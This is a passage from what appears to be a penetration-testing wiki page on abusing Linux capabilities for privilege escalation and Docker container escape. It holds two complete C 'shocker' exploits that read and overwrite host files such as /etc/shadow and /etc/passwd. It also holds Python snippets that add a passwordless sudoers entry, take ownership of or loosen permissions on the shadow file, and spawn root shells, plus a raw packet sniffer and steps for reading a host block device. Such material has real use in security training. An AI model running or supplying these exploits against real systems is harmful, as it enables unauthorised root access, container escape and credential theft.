Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Inside the previous output you can see that the **DAC_READ_SEARCH** capability is enabled. As a result, the container can **debug processes**.

You can learn how the following exploiting works in [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) but in resume **CAP_DAC_READ_SEARCH** not only allows us to traverse the file system without permission checks, but also explicitly removes any checks to _**open_by_handle_at(2)**_ and **could allow our process to sensitive files opened by other processes**.

The original exploit that abuse this permissions to read files from the host can be found here: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), the following is a **modified version that allows you to indicate the file you want to read as first argument and dump it in a file.**

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };

    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

    read(0, buf, 1);

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");

    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    printf("Success!!\n");

    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);

    close(fd2); close(fd1);

    return 0;
}
```

> [!WARNING]
> The exploit needs to find a pointer to something mounted on the host. The original exploit used the file /.dockerinit and this modified version uses /etc/hostname. If the exploit isn't working maybe you need to set a different file. To find a file that is mounted in the host just execute mount command:

![](<../../images/image (407) (1).png>)

**The code of this technique was copied from the laboratory of "Abusing DAC_READ_SEARCH Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)


## CAP_DAC_OVERRIDE

**This mean that you can bypass write permission checks on any file, so you can write any file.**

There are a lot of files you can **overwrite to escalate privileges,** [**you can get ideas from here**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Example with binary**

In this example vim has this capability, so you can modify any file like _passwd_, _sudoers_ or _shadow_:

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**Example with binary 2**

In this example **`python`** binary will have this capability. You could use python to override any file:

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**Example with environment + CAP_DAC_READ_SEARCH (Docker breakout)**

You can check the enabled capabilities inside the docker container using:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

First of all read the previous section that [**abuses DAC_READ_SEARCH capability to read arbitrary files**](linux-capabilities.md#cap_dac_read_search) of the host and **compile** the exploit.\
Then, **compile the following version of the shocker exploit** that will allow you to **write arbitrary files** inside the hosts filesystem:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```

In order to scape the docker container you could **download** the files `/etc/shadow` and `/etc/passwd` from the host, **add** to them a **new user**, and use **`shocker_write`** to overwrite them. Then, **access** via **ssh**.

**The code of this technique was copied from the laboratory of "Abusing DAC_OVERRIDE Capability" from** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP_CHOWN

**This means that it's possible to change the ownership of any file.**

**Example with binary**

Lets suppose the **`python`** binary has this capability, you can **change** the **owner** of the **shadow** file, **change root password**, and escalate privileges:

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

Or with the **`ruby`** binary having this capability:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP_FOWNER

**This means that it's possible to change the permission of any file.**

**Example with binary**

If python has this capability you can modify the permissions of the shadow file, **change root password**, and escalate privileges:

```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```

### CAP_SETUID

**This means that it's possible to set the effective user id of the created process.**

**Example with binary**

If python has this **capability**, you can very easily abuse it to escalate privileges to root:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Another way:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

## CAP_SETGID

**This means that it's possible to set the effective group id of the created process.**

There are a lot of files you can **overwrite to escalate privileges,** [**you can get ideas from here**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Example with binary**

In this case you should look for interesting files that a group can read because you can impersonate any group:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Once you have find a file you can abuse (via reading or writing) to escalate privileges you can **get a shell impersonating the interesting group** with:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

In this case the group shadow was impersonated so you can read the file `/etc/shadow`:

```bash
cat /etc/shadow
```

If **docker** is installed you could **impersonate** the **docker group** and abuse it to communicate with the [**docker socket** and escalate privileges](#writable-docker-socket).

## CAP_SETFCAP

**This means that it's possible to set capabilities on files and processes**

**Example with binary**

If python has this **capability**, you can very easily abuse it to escalate privileges to root:

```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> Note that if you set a new capability to the binary with CAP_SETFCAP, you will lose this cap.

Once you have [SETUID capability](linux-capabilities.md#cap_setuid) you can go to its section to see how to escalate privileges.

**Example with environment (Docker breakout)**

By default the capability **CAP_SETFCAP is given to the proccess inside the container in Docker**. You can check that doing something like:

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

This capability allow to **give any other capability to binaries**, so we could think about **escaping** from the container **abusing any of the other capability breakouts** mentioned in this page.\
However, if you try to give for example the capabilities CAP_SYS_ADMIN and CAP_SYS_PTRACE to the gdb binary, you will find that you can give them, but the **binary won’t be able to execute after this**:

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: This is a **limiting superset for the effective capabilities** that the thread may assume. It is also a limiting superset for the capabilities that may be added to the inheri‐table set by a thread that **does not have the CAP_SETPCAP** capability in its effective set._\
It looks like the Permitted capabilities limit the ones that can be used.\
However, Docker also grants the **CAP_SETPCAP** by default, so you might be able to **set new capabilities inside the inheritables ones**.\
However, in the documentation of this cap: _CAP_SETPCAP : \[…] **add any capability from the calling thread’s bounding** set to its inheritable set_.\
It looks like we can only add to the inheritable set capabilities from the bounding set. Which means that **we cannot put new capabilities like CAP_SYS_ADMIN or CAP_SYS_PTRACE in the inherit set to escalate privileges**.

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) provides a number of sensitive operations including access to `/dev/mem`, `/dev/kmem` or `/proc/kcore`, modify `mmap_min_addr`, access `ioperm(2)` and `iopl(2)` system calls, and various disk commands. The `FIBMAP ioctl(2)` is also enabled via this capability, which has caused issues in the [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). As per the man page, this also allows the holder to descriptively `perform a range of device-specific operations on other devices`.

This can be useful for **privilege escalation** and **Docker breakout.**

## CAP_KILL

**This means that it's possible to kill any process.**

**Example with binary**

Lets suppose the **`python`** binary has this capability. If you could **also modify some service or socket configuration** (or any configuration file related to a service) file, you could backdoor it, and then kill the process related to that service and wait for the new configuration file to be executed with your backdoor.

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc with kill**

If you have kill capabilities and there is a **node program running as root** (or as a different user)you could probably **send** it the **signal SIGUSR1** and make it **open the node debugger** to where you can connect.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```



{{#ref}}
electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**This means that it's possible to listen in any port (even in privileged ones).** You cannot escalate privileges directly with this capability.

**Example with binary**

If **`python`** has this capability it will be able to listen on any port and even connect from it to any other port (some services require connections from specific privileges ports)

{{#tabs}}
{{#tab name="Listen"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

{{#endtab}}

{{#tab name="Connect"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability permits processes to **create RAW and PACKET sockets**, enabling them to generate and send arbitrary network packets. This can lead to security risks in containerized environments, such as packet spoofing, traffic injection, and bypassing network access controls. Malicious actors could exploit this to interfere with container routing or compromise host network security, especially without adequate firewall protections. Additionally, **CAP_NET_RAW** is crucial for privileged containers to support operations like ping via RAW ICMP requests.

**This means that it's possible to sniff traffic.** You cannot escalate privileges directly with this capability.

**Example with binary**

If the binary **`tcpdump`** has this capability you will be able to use it to capture network information.

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

Note that if the **environment** is giving this capability you could also use **`tcpdump`** to sniff traffic.

**Example with binary 2**

The following example is **`python2`** code that can be useful to intercept traffic of the "**lo**" (**localhost**) interface. The code is from the lab "_The Basics: CAP-NET_BIND + NET_RAW_" from [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```

## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability grants the holder the power to **alter network configurations**, including firewall settings, routing tables, socket permissions, and network interface settings within the exposed network namespaces. It also enables turning on **promiscuous mode** on network interfaces, allowing for packet sniffing across namespaces.

**Example with binary**

Lets suppose that the **python binary** has these capabilities.

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP_LINUX_IMMUTABLE

**This means that it's possible modify inode attributes.** You cannot escalate privileges directly with this capability.

**Example with binary**

If you find that a file is immutable and python has this capability, you can **remove the immutable attribute and make the file modifiable:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```

> [!TIP]
> Note that usually this immutable attribute is set and remove using:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) enables the execution of the `chroot(2)` system call, which can potentially allow for the escape from `chroot(2)` environments through known vulnerabilities:

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) not only allows the execution of the `reboot(2)` system call for system restarts, including specific commands like `LINUX_REBOOT_CMD_RESTART2` tailored for certain hardware platforms, but it also enables the use of `kexec_load(2)` and, from Linux 3.17 onwards, `kexec_file_load(2)` for loading new or signed crash kernels respectively.

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) was separated from the broader **CAP_SYS_ADMIN** in Linux 2.6.37, specifically granting the ability to use the `syslog(2)` call. This capability enables the viewing of kernel addresses via `/proc` and similar interfaces when the `kptr_restrict` setting is at 1, which controls the exposure of kernel addresses. Since Linux 2.6.39, the default for `kptr_restrict` is 0, meaning kernel addresses are exposed, though many distributions set this to 1 (hide addresses except from uid 0) or 2 (always hide addresses) for security reasons.

Additionally, **CAP_SYSLOG** allows accessing `dmesg` output when `dmesg_restrict` is set to 1. Despite these changes, **CAP_SYS_ADMIN** retains the ability to perform `syslog` operations due to historical precedents.

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) extends the functionality of the `mknod` system call beyond creating regular files, FIFOs (named pipes), or UNIX domain sockets. It specifically allows for the creation of special files, which include:

- **S_IFCHR**: Character special files, which are devices like terminals.
- **S_IFBLK**: Block special files, which are devices like disks.

This capability is essential for processes that require the ability to create device files, facilitating direct hardware interaction through character or block devices.

It is a default docker capability ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

This capability permits to do privilege escalations (through full disk read) on the host, under these conditions:

1. Have initial access to the host (Unprivileged).
2. Have initial access to the container (Privileged (EUID 0), and effective `CAP_MKNOD`).
3. Host and container should share the same user namespace.

**Steps to Create and Access a Block Device in a Container:**

1. **On the Host as a Standard User:**

   - Determine your current user ID with `id`, e.g., `uid=1000(standarduser)`.
   - Identify the target device, for example, `/dev/sdb`.

2. **Inside the Container as `root`:**

```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```

3. **Back on the Host:**

```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```

This approach allows the standard user to access and potentially read data from `/dev/sdb` through the container, exploiting shared user namespaces and permissions set on the device.

### CAP_SETPCAP

**CAP_SETPCAP** enables a process to **alter the capability sets** of another process, allowing for the addition or removal of capabilities from the effective, inheritable, and permitted sets. However, a process can only modify capabilities that it possesses in its own permitted set, ensuring it cannot elevate another process's privileges beyond its own. Recent kernel updates have tightened these rules, restricting `CAP_SETPCAP` to only diminish the capabilities within its own or its descendants' permitted sets, aiming to mitigate security risks. Usage requires having `CAP_SETPCAP` in the effective set and the target capabilities in the permitted set, utilizing `capset()` for modifications. This summarizes the core function and limitations of `CAP_SETPCAP`, highlighting its role in privilege management and security enhancement.

**`CAP_SETPCAP`** is a Linux capability that allows a process to **modify the capability sets of another process**. It grants the ability to add or remove capabilities from the effective, inheritable, and permitted capability sets of other processes. However, there are certain restrictions on how this capability can be used.

A process with `CAP_SETPCAP` **can only grant or remove capabilities that are in its own permitted capability set**. In other words, a process cannot grant a capability to another process if it does not have that capability itself. This restriction prevents a process from elevating the privileges of another process beyond its own level of privilege.

Moreover, in recent kernel versions, the `CAP_SETPCAP` capability has been **further restricted**. It no longer allows a process to arbitrarily modify the capability sets of other processes. Instead, it **only allows a process to lower the capabilities in its own permitted capability set or the permitted capability set of its descendants**. This change was introduced to reduce potential security risks associated with the capability.

To use `CAP_SETPCAP` effectively, you need to have the capability in your effective capability set and the target capabilities in your permitted capability set. You can then use the `capset()` system call to modify the capability sets of other processes.

In summary, `CAP_SETPCAP` allows a process to modify the capability sets of other processes, but it cannot grant capabilities that it doesn't have itself. Additionally, due to security concerns, its functionality has been limited in recent kernel versions to only allow reducing capabilities in its own permitted capability set or the permitted capability sets of its descendants.

## References

**Most of these examples were taken from some labs of** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), so if you want to practice this privesc techniques I recommend these labs.

**Other references**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}

